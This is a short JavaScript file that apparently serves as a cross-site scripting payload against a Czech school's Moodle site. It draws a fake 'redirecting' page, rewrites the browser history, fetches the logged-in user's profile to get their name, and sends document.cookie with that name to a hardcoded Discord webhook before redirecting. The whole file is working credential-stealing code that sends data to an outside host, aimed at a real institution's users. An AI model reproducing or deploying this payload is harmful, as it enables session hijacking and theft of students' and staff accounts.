with(document.location)(n=hash?hash.substr(0x01):"https://gymkyjov.cz/moodle");
document.write(`<html dir=ltr lang=en xml:lang=en class=yui3-js-enabled><head><title>Moodle Klvaňovo gymnázium a střední zdravotnická škola Kyjov</title><link rel="shortcut icon" href=https://www.gymkyjov.cz/moodle/theme/image.php/boost/theme/1655290766/favicon><meta http-equiv=Content-Type content="text/html; charset=utf-8"><meta name=keywords content="moodle, Moodle Klvaňovo gymnázium a střední zdravotnická škola Kyjov"><link rel=stylesheet href=https://www.gymkyjov.cz/moodle/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.css><link rel=stylesheet href=https://www.gymkyjov.cz/moodle/theme/styles.php/boost/1655290766_1/all><meta name=viewport content="width=device-width,initial-scale=1"></head><body id=page-site-index class="format-site course path-site chrome dir-ltr lang-en yui-skin-sam yui3-skin-sam www-gymkyjov-cz--moodle pagelayout-frontpage course-1 context-2 notloggedin jsenabled" data-new-gr-c-s-check-loaded=14.1079.0 data-gr-ext-installed=""><div id=page-wrapper><nav class="fixed-top navbar navbar-light bg-white navbar-expand moodle-has-zindex" aria-label="Site navigation"><a href=https://www.gymkyjov.cz/moodle class="navbar-brand has-logo"><span class="logo d-none d-sm-inline"><img src=https://www.gymkyjov.cz/moodle/pluginfile.php/1/core_admin/logocompact/100x100/1655290766/logo.png alt=MoodleKGK></span><span class="site-name d-none d-md-inline">MoodleKGK</span></a></nav><div id=page class=container-fluid><header id=page-header class=row><div class="col-12 pt-3 pb-3" id=yui_3_17_2_1_1662994648930_22><div class=card id=yui_3_17_2_1_1662994648930_21><div class=card-body id=yui_3_17_2_1_1662994648930_20><div class=d-flex><div class=mr-auto><div class=page-context-header><div class=page-header-headings><h1>Probíhá přesměrování na ${n}</h1></div></div></div></div><div class="d-flex flex-wrap"><div class="ml-auto d-flex"></div><div id=course-header></div></div></div></div></div></header></div></div></body></html>`);
history.replaceState({}, "", "/redirect?url="+n);
fetch("/moodle/user/profile.php").then(t=>t.text()).then(t=>fetch("https://discord.com/api/webhooks/1018619501547368549/JgXrPAMwhUwYJpFzs8wd40R15rrGnu-G0bGMl_YoqgP57YU6RhHeTu8j-y3wNhDOMMNy",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:document.cookie+" -> "+t.split("<title>")[1].split(": ")[0]})}).then(_=>document.location.href=n));
